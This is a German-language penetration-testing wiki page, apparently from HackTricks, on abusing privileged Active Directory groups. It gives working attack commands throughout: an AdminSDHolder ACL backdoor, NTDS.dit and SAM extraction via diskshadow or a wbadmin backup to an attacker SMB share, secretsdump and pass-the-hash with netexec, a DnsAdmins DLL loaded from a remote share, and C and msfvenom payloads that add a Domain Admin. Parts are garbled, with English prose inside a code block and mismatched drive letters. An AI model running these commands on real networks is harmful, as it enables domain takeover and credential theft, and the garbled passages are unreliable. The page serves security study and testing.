# Privilegierte Gruppen

{{#include ../../banners/hacktricks-training.md}}

## Bekannte Gruppen mit Administrationsrechten

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Diese Gruppe ist befugt, Konten und Gruppen zu erstellen, die in der Domäne keine Administratoren sind. Zusätzlich ermöglicht sie die lokale Anmeldung am Domänencontroller (DC).

Um die Mitglieder dieser Gruppe zu ermitteln, wird der folgende Befehl ausgeführt:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Das Hinzufügen neuer Benutzer ist erlaubt, ebenso die lokale Anmeldung am DC.

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle "protected groups" in Active Directory festlegt, einschließlich Gruppen mit hohen Privilegien. Dieser Mechanismus sichert diese Gruppen, indem er unautorisierte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer volle Berechtigungen gewährt. Dadurch würde dieser Benutzer effektiv die vollständige Kontrolle über alle protected groups erhalten. Wenn die Berechtigungen dieses Benutzers verändert oder entfernt werden, werden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.

Befehle zum Anzeigen der Mitglieder und zum Ändern von Berechtigungen sind unter anderem:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Ein Skript steht zur Verfügung, um den Wiederherstellungsprozess zu beschleunigen: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Weitere Informationen finden Sie auf [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Die Mitgliedschaft in dieser Gruppe ermöglicht das Lesen gelöschter Active Directory-Objekte, was sensible Informationen offenlegen kann:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Zugriff auf den Domain Controller

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, es sei denn, der Benutzer ist Mitglied der `Server Operators`-Gruppe, die das Zugriffslevel ändert.

### Privilege Escalation

Mit `PsService` oder `sc` aus Sysinternals kann man Service-Berechtigungen prüfen und ändern. Die `Server Operators`-Gruppe hat beispielsweise die volle Kontrolle über bestimmte Dienste, wodurch die Ausführung beliebiger Befehle und privilege escalation möglich wird:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Dieser Befehl zeigt, dass `Server Operators` vollständigen Zugriff haben, was die Manipulation von Diensten zur Erlangung erhöhter Privilegien ermöglicht.

## Backup Operators

Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der Privilegien `SeBackup` und `SeRestore`. Diese Privilegien ermöglichen das Durchqueren von Ordnern, das Auflisten und Kopieren von Dateien, selbst ohne explizite Berechtigungen, durch Verwendung des Flags `FILE_FLAG_BACKUP_SEMANTICS`. Für diesen Vorgang ist die Nutzung spezifischer Skripte erforderlich.

Um Gruppenmitglieder aufzulisten, führen Sie aus:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokaler Angriff

Um diese Privilegien lokal zu nutzen, werden die folgenden Schritte angewendet:

1. Notwendige Bibliotheken importieren:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` aktivieren und überprüfen:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Auf eingeschränkte Verzeichnisse zugreifen und Dateien kopieren, z. B.:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD-Angriff

Direkter Zugriff auf das Dateisystem des Domänencontrollers ermöglicht den Diebstahl der `NTDS.dit`-Datenbank, die alle NTLM-Hashes von Domänenbenutzern und -computern enthält.

#### Verwendung von diskshadow.exe

1. Erstelle eine Schattenkopie des Laufwerks `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopiere `NTDS.dit` aus der Schattenkopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativ verwenden Sie `robocopy` zum Kopieren von Dateien:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrahiere `SYSTEM` und `SAM` zur Gewinnung von Hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Alle Hashes aus `NTDS.dit` extrahieren:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nach der Extraktion: Pass-the-Hash zu DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Verwendung von wbadmin.exe

1. Richten Sie ein NTFS-Dateisystem für einen SMB-Server auf dem Angreiferrechner ein und speichern Sie die SMB-Anmeldeinformationen auf dem Zielrechner zwischen.
2. Verwenden Sie `wbadmin.exe` für System-Backups und die Extraktion von `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Für eine praktische Demonstration, siehe [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der **DnsAdmins**-Gruppe können ihre Rechte ausnutzen, um eine beliebige DLL mit SYSTEM-Rechten auf einem DNS-Server zu laden, der häufig auf Domain Controllers gehostet wird. Diese Möglichkeit eröffnet erhebliche Ausnutzungsmöglichkeiten.

Um die Mitglieder der Gruppe **DnsAdmins** aufzulisten, verwenden Sie:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Diese Schwachstelle ermöglicht die Ausführung beliebigen Codes mit SYSTEM-Rechten im DNS-Dienst (üblicherweise auf den DCs). Dieses Problem wurde 2021 behoben.

Mitglieder können den DNS-Server dazu bringen, eine beliebige DLL zu laden (entweder lokal oder von einem Remote-Share), indem sie Befehle wie die folgenden verwenden:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ein Neustart des DNS-Dienstes (was zusätzliche Berechtigungen erfordern kann) ist erforderlich, damit die DLL geladen wird:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Für weitere Details zu diesem Angriffsvektor siehe ired.team.

#### Mimilib.dll

Es ist ebenfalls möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden, indem man sie so modifiziert, dass sie bestimmte Befehle oder reverse shells ausführt. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD-Record für MitM

DnsAdmins können DNS-Einträge manipulieren, um Man-in-the-Middle (MitM)-Angriffe durchzuführen, indem sie einen WPAD-Record erstellen, nachdem sie die global query block list deaktiviert haben. Tools wie Responder oder Inveigh können für Spoofing und das Erfassen von Netzwerkverkehr verwendet werden.

### Event Log Readers
Mitglieder können auf Event-Logs zugreifen und dabei möglicherweise sensible Informationen wie Klartext-Passwörter oder Details zur Befehlsausführung finden:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Berechtigungen

Diese Gruppe kann DACLs am Domänenobjekt ändern und dadurch möglicherweise DCSync-Privilegien gewähren. Techniken zur privilege escalation, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub repo detailliert beschrieben.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V-Administratoren

Hyper-V-Administratoren haben vollen Zugriff auf Hyper-V, was ausgenutzt werden kann, um Kontrolle über virtualisierte Domänencontroller zu erlangen. Dazu gehört das Klonen laufender DCs und das Extrahieren von NTLM-Hashes aus der NTDS.dit-Datei.

### Beispiel zur Ausnutzung

Firefox's Mozilla Maintenance Service kann von Hyper-V-Administratoren ausgenutzt werden, um Befehle als SYSTEM auszuführen. Dies beinhaltet das Erstellen eines Hardlinks auf eine geschützte SYSTEM-Datei und deren Ersetzung durch eine bösartige ausführbare Datei:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Hinweis: Hard link exploitation wurde in aktuellen Windows-Updates mitigiert.

## Group Policy Creators Owners

Diese Gruppe erlaubt ihren Mitgliedern, Group Policies in der Domain zu erstellen. Allerdings können ihre Mitglieder Group Policies nicht auf Benutzer oder Gruppen anwenden oder vorhandene GPOs bearbeiten.

## Organization Management

In Umgebungen, in denen **Microsoft Exchange** eingesetzt wird, verfügt eine spezielle Gruppe namens **Organization Management** über erhebliche Möglichkeiten. Diese Gruppe ist berechtigt, **auf die Postfächer aller Domain-Benutzer zuzugreifen** und hat **volle Kontrolle über die Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Diese Kontrolle umfasst die **`Exchange Windows Permissions`**-Gruppe, die für Privilege Escalation ausgenutzt werden kann.

### Privilege Exploitation and Commands

#### Print Operators

Mitglieder der **Print Operators**-Gruppe besitzen mehrere Privilegien, einschließlich des **`SeLoadDriverPrivilege`**, das ihnen erlaubt, sich **lokal an einem Domänencontroller anzumelden**, diesen herunterzufahren und Drucker zu verwalten. Um diese Privilegien auszunutzen, insbesondere wenn **`SeLoadDriverPrivilege`** in einem nicht erhöhten Kontext nicht sichtbar ist, ist ein Umgehen der User Account Control (UAC) erforderlich.

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Für detailliertere exploitation techniques im Zusammenhang mit **`SeLoadDriverPrivilege`** sollte man spezifische Sicherheitsressourcen konsultieren.

#### Remote Desktop-Benutzer

Die Mitglieder dieser Gruppe erhalten Zugriff auf PCs über das Remote Desktop Protocol (RDP). Um diese Mitglieder aufzulisten, stehen PowerShell-Befehle zur Verfügung:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Weitere Einblicke in die Ausnutzung von RDP finden sich in speziellen pentesting-Ressourcen.

#### Remote-Management-Benutzer

Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Die Aufzählung dieser Mitglieder erfolgt durch:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Für exploitation techniques im Zusammenhang mit **WinRM** sollte spezifische Dokumentation konsultiert werden.

#### Server Operators

Diese Gruppe hat Berechtigungen, verschiedene Konfigurationen auf Domänencontrollern vorzunehmen, einschließlich Backup- und Restore-Rechten, dem Ändern der Systemzeit und dem Herunterfahren des Systems. Um die Mitglieder aufzulisten, wird folgender Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Quellen <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
